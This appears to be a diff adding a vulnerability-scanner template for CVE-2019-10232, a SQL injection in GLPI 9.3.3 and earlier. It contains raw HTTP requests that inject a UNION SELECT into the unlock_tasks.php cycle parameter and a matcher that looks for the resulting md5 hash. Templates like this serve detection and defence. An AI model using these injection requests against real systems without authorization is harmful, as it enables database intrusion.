@@ -1,0 +1,35 @@
+id: CVE-2019-10232
+info:
+  name: GLPI 9.3.3 SQL Injection (CVE-2019-10232)
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Teclib GLPI 9.3.3 and earlier versions contain a SQL Injection vulnerability in the cycle parameter of the unlock_tasks.php file allowing remote attackers to execute arbitrary SQL commands.
+  classification:
+    cve-id: CVE-2019-10232
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+  tags: sql-injection, glpi
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2019-10232
+
+http:
+  - raw:
+      - |
+        GET /scripts/unlock_tasks.php?cycle=1%20UNION%20ALL%20SELECT%201,md5(123)--%20&only_tasks=1 HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /glpi/scripts/unlock_tasks.php?cycle=1%20UNION%20ALL%20SELECT%201,md5(123)--%20&only_tasks=1 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "202cb962ac59075b964b07152d234b70"
+        part: body
+
+      - type: status
+        status:
+          - 200
